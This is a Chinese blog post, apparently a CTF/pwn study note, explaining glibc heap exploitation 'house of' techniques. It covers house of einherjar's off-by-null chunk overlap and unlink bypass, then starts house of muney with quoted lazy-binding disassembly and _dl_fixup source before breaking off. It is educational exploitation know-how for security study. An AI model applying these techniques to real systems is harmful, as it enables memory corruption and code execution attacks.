<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>how2heap | S1nec-1o's B1og</title><meta name="author" content="s1nec-1o"><meta name="copyright" content="s1nec-1o"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="house of手法前言house of的手法只需理解其中的技巧，了解如何从小小的漏洞获得rce house of einherjar漏洞成因溢出写、off by one、off by null 适用范围 2.23—— 至今 可分配大于处于 unsortedbin 的 chunk  利用原理利用 off by null 修改掉 chunk 的 size 域的 P 位，绕过 unlink 检查，在堆">
<meta property="og:type" content="article">
<meta property="og:title" content="how2heap">
<meta property="og:url" content="http://s1nec-1o.github.io/2025/02/21/how2heap/index.html">
<meta property="og:site_name" content="S1nec-1o&#39;s B1og">
<meta property="og:description" content="house of手法前言house of的手法只需理解其中的技巧，了解如何从小小的漏洞获得rce house of einherjar漏洞成因溢出写、off by one、off by null 适用范围 2.23—— 至今 可分配大于处于 unsortedbin 的 chunk  利用原理利用 off by null 修改掉 chunk 的 size 域的 P 位，绕过 unlink 检查，在堆">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png">
<meta property="article:published_time" content="2025-02-21T12:41:20.000Z">
<meta property="article:modified_time" content="2025-02-21T12:52:11.452Z">
<meta property="article:author" content="s1nec-1o">
<meta property="article:tag" content="traditional pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281712481.jpg"><link rel="canonical" href="http://s1nec-1o.github.io/2025/02/21/how2heap/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"距离文章发布已经过去","messageNext":"天了，信息可能已经过时"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'how2heap',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-02-21 20:52:11'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 8 || hour >= 20
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="S1nec-1o's B1og" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">51</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">26</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281616326.png')"><nav id="nav"><span id="blog-info"><a href="/" title="S1nec-1o's B1og"><span class="site-name">S1nec-1o's B1og</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">how2heap</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-21T12:41:20.000Z" title="发表于 2025-02-21 20:41:20">2025-02-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-21T12:52:11.452Z" title="更新于 2025-02-21 20:52:11">2025-02-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/house-of/">house of</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="house-of手法"><a href="#house-of手法" class="headerlink" title="house of手法"></a>house of手法</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>house of的手法只需理解其中的技巧，了解如何从小小的漏洞获得rce</p>
<h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>溢出写、<code>off by one</code>、<code>off by null</code></p>
<h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>可分配大于处于 <code>unsortedbin</code> 的 <code>chunk</code></li>
</ul>
<h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用 <code>off by null</code> 修改掉 <code>chunk</code> 的 <code>size</code> 域的 <code>P</code> 位，绕过 <code>unlink</code> 检查，在堆的后向合并过程中构造出 <code>chunk overlapping</code>。</p>
<ul>
<li>申请 <code>chunk A、chunk B、chunk C、chunk D</code>，<code>chunk D</code> 用来做 <code>gap</code>，<code>chunk A、chunk C</code> 都要处于 <code>unsortedbin</code> 范围</li>
<li>释放 <code>A</code>，进入 <code>unsortedbin</code></li>
<li>对 <code>B</code> 写操作的时候存在 <code>off by null</code>，修改了 <code>C</code> 的 <code>P</code> 位</li>
<li>释放 <code>C</code> 的时候，堆后向合并，直接把 <code>A、B、C</code> 三块内存合并为了一个 <code>chunk</code>，并放到了 <code>unsortedbin</code> 里面</li>
<li>读写合并后的大 <code>chunk</code> 可以操作 <code>chunk B</code> 的内容，<code>chunk B</code> 的头</li>
</ul>
<h3 id="相关技巧"><a href="#相关技巧" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>虽然该利用技巧至今仍可以利用，但是需要对 <code>unlink</code> 绕过的条件随着版本的增加有所变化。</p>
<p>最开始的 <code>unlink</code> 的代码是：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;								      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;								      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;								      \</span></span><br><span class="line"><span class="meta">		<span class="comment">// .....							      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      &#125;									      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>只需要绕过<code>__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)</code> 即可，因此，不需要伪造地址处于高位的 <code>chunk</code> 的 <code>presize</code> 域。</p>
<p>高版本的 <code>unlink</code> 的条件是：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">chunksize</span> (p) != <span class="built_in">prev_size</span> (<span class="built_in">next_chunk</span> (p)))  <span class="comment">//new</span></span><br><span class="line">    <span class="built_in">malloc_printerr</span> (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    <span class="built_in">malloc_printerr</span> (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line">	<span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>新增了 <code>chunksize (p) != prev_size (next_chunk (p))</code>，对 <code>chunksize</code> 有了检查，伪造的时候需要绕过。</p>
<h3 id="利用效果"><a href="#利用效果" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>构造 <code>chunk overlap</code> 后，可以任意地址分配</li>
<li>结合其他方法进行任意地址读写</li>
</ul>
<h2 id="House-of-muney"><a href="#House-of-muney" class="headerlink" title="House of muney"></a>House of muney</h2><h3 id="利用版本"><a href="#利用版本" class="headerlink" title="利用版本"></a>利用版本</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<p>这里分析函数延迟绑定机制中写入真实地址的过程</p>
<p>首先<code>push n;push m;jmp _dl_runtime_resolve_xsavec;</code></p>
<blockquote>
<p>n是函数在.rela.plt的位置</p>
<p>m是codebase</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0x7ffff7fd8d30 &lt;_dl_runtime_resolve_xsavec&gt;: endbr64</span><br><span class="line">   0x7ffff7fd8d34 &lt;_dl_runtime_resolve_xsavec+4&gt;:       push   rbx</span><br><span class="line">   0x7ffff7fd8d35 &lt;_dl_runtime_resolve_xsavec+5&gt;:       mov    rbx,rsp</span><br><span class="line">   0x7ffff7fd8d38 &lt;_dl_runtime_resolve_xsavec+8&gt;:       and    rsp,0xffffffffffffffc0</span><br><span class="line">   0x7ffff7fd8d3c &lt;_dl_runtime_resolve_xsavec+12&gt;:      sub    rsp,QWORD PTR [rip+0x23f4d]        # 0x7ffff7ffcc90 &lt;_rtld_global_ro+432&gt;</span><br><span class="line">   0x7ffff7fd8d43 &lt;_dl_runtime_resolve_xsavec+19&gt;:      mov    QWORD PTR [rsp],rax</span><br><span class="line">   0x7ffff7fd8d47 &lt;_dl_runtime_resolve_xsavec+23&gt;:      mov    QWORD PTR [rsp+0x8],rcx</span><br><span class="line">   0x7ffff7fd8d4c &lt;_dl_runtime_resolve_xsavec+28&gt;:      mov    QWORD PTR [rsp+0x10],rdx</span><br><span class="line">   0x7ffff7fd8d51 &lt;_dl_runtime_resolve_xsavec+33&gt;:      mov    QWORD PTR [rsp+0x18],rsi</span><br><span class="line">   0x7ffff7fd8d56 &lt;_dl_runtime_resolve_xsavec+38&gt;:      mov    QWORD PTR [rsp+0x20],rdi</span><br><span class="line">   0x7ffff7fd8d5b &lt;_dl_runtime_resolve_xsavec+43&gt;:      mov    QWORD PTR [rsp+0x28],r8</span><br><span class="line">   0x7ffff7fd8d60 &lt;_dl_runtime_resolve_xsavec+48&gt;:      mov    QWORD PTR [rsp+0x30],r9</span><br><span class="line">   0x7ffff7fd8d65 &lt;_dl_runtime_resolve_xsavec+53&gt;:      mov    eax,0xee</span><br><span class="line">   0x7ffff7fd8d6a &lt;_dl_runtime_resolve_xsavec+58&gt;:      xor    edx,edx</span><br><span class="line">   0x7ffff7fd8d6c &lt;_dl_runtime_resolve_xsavec+60&gt;:      mov    QWORD PTR [rsp+0x250],rdx</span><br><span class="line">   0x7ffff7fd8d74 &lt;_dl_runtime_resolve_xsavec+68&gt;:      mov    QWORD PTR [rsp+0x258],rdx</span><br><span class="line">   0x7ffff7fd8d7c &lt;_dl_runtime_resolve_xsavec+76&gt;:      mov    QWORD PTR [rsp+0x260],rdx</span><br><span class="line">   0x7ffff7fd8d84 &lt;_dl_runtime_resolve_xsavec+84&gt;:      mov    QWORD PTR [rsp+0x268],rdx</span><br><span class="line">   0x7ffff7fd8d8c &lt;_dl_runtime_resolve_xsavec+92&gt;:      mov    QWORD PTR [rsp+0x270],rdx</span><br><span class="line">   0x7ffff7fd8d94 &lt;_dl_runtime_resolve_xsavec+100&gt;:     mov    QWORD PTR [rsp+0x278],rdx</span><br><span class="line">   0x7ffff7fd8d9c &lt;_dl_runtime_resolve_xsavec+108&gt;:     xsavec [rsp+0x40]</span><br><span class="line">   0x7ffff7fd8da1 &lt;_dl_runtime_resolve_xsavec+113&gt;:     mov    rsi,QWORD PTR [rbx+0x10]</span><br><span class="line">   0x7ffff7fd8da5 &lt;_dl_runtime_resolve_xsavec+117&gt;:     mov    rdi,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x7ffff7fd8da9 &lt;_dl_runtime_resolve_xsavec+121&gt;:     call   0x7ffff7fd5e70 &lt;_dl_fixup&gt;</span><br><span class="line">   0x7ffff7fd8dae &lt;_dl_runtime_resolve_xsavec+126&gt;:     mov    r11,rax</span><br><span class="line">   0x7ffff7fd8db1 &lt;_dl_runtime_resolve_xsavec+129&gt;:     mov    eax,0xee</span><br><span class="line">   0x7ffff7fd8db6 &lt;_dl_runtime_resolve_xsavec+134&gt;:     xor    edx,edx</span><br><span class="line">   0x7ffff7fd8db8 &lt;_dl_runtime_resolve_xsavec+136&gt;:     xrstor [rsp+0x40]</span><br><span class="line">   0x7ffff7fd8dbd &lt;_dl_runtime_resolve_xsavec+141&gt;:     mov    r9,QWORD PTR [rsp+0x30]</span><br><span class="line">   0x7ffff7fd8dc2 &lt;_dl_runtime_resolve_xsavec+146&gt;:     mov    r8,QWORD PTR [rsp+0x28]</span><br><span class="line">   0x7ffff7fd8dc7 &lt;_dl_runtime_resolve_xsavec+151&gt;:     mov    rdi,QWORD PTR [rsp+0x20]</span><br><span class="line">   0x7ffff7fd8dcc &lt;_dl_runtime_resolve_xsavec+156&gt;:     mov    rsi,QWORD PTR [rsp+0x18]</span><br><span class="line">   0x7ffff7fd8dd1 &lt;_dl_runtime_resolve_xsavec+161&gt;:     mov    rdx,QWORD PTR [rsp+0x10]</span><br><span class="line">   0x7ffff7fd8dd6 &lt;_dl_runtime_resolve_xsavec+166&gt;:     mov    rcx,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x7ffff7fd8ddb &lt;_dl_runtime_resolve_xsavec+171&gt;:     mov    rax,QWORD PTR [rsp]</span><br><span class="line">   0x7ffff7fd8ddf &lt;_dl_runtime_resolve_xsavec+175&gt;:     mov    rsp,rbx</span><br><span class="line">   0x7ffff7fd8de2 &lt;_dl_runtime_resolve_xsavec+178&gt;:     mov    rbx,QWORD PTR [rsp]</span><br><span class="line">   0x7ffff7fd8de6 &lt;_dl_runtime_resolve_xsavec+182&gt;:     add    rsp,0x18</span><br><span class="line">   0x7ffff7fd8dea &lt;_dl_runtime_resolve_xsavec+186&gt;:     jmp    r11</span><br></pre></td></tr></table></figure>

<p>保存工作状态，然后<code>jmp r11，即jmp _dl_fixup</code></p>
<p>一下分析<code>_dl_fixup</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This function is called through a special trampoline from the PLT the</span></span><br><span class="line"><span class="comment">   first time each PLT entry is called.  We must perform the relocation</span></span><br><span class="line"><span class="comment">   specified in the PLT of the given shared object, and return the resolved</span></span><br><span class="line"><span class="comment">   function address to the trampoline, which will restart the original call</span></span><br><span class="line"><span class="comment">   to that address.  Future calls will bounce directly from the PLT to the</span></span><br><span class="line"><span class="comment">   function.  */</span></span><br><span class="line"></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">	   <span class="keyword">struct</span> link_map *l, <span class="built_in">ElfW</span>(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 这里的l是二进制程序本身的link_map，而不是so的</span></span><br><span class="line">  <span class="comment">// 第一个参数是上面的m，即codebase，第二个参数是上述的n，即.rela.plt的偏移</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 首先根据link_map中记录的信息，找到动态链接相关的符号表和字符串表</span></span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span></span><br><span class="line"><span class="function">    </span>= (<span class="type">const</span> <span class="type">void</span> *) <span class="built_in">D_PTR</span> (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) <span class="built_in">D_PTR</span> (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 找到对应的重定位元素、符号表、字符串</span></span><br><span class="line">  <span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) (<span class="built_in">D_PTR</span> (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[<span class="built_in">ELFW</span>(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line">  <span class="comment">// rel_addr 即为got表的地址，在查找到符号真实地址之后会回填到这个地址中</span></span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="type">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  <span class="built_in">assert</span> (<span class="built_in">ELFW</span>(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (<span class="built_in">ELFW</span>(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">r_found_version</span> *version = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[<span class="built_in">VERSYMIDX</span> (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">	    (<span class="type">const</span> <span class="type">void</span> *) <span class="built_in">D_PTR</span> (l, l_info[<span class="built_in">VERSYMIDX</span> (DT_VERSYM)]);</span><br><span class="line">	  <span class="built_in">ElfW</span>(Half) ndx = vernum[<span class="built_in">ELFW</span>(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    version = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">	 not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">	 we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">THREAD_GSCOPE_SET_FLAG</span> ();</span><br><span class="line">	  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">	&#125;</span><br><span 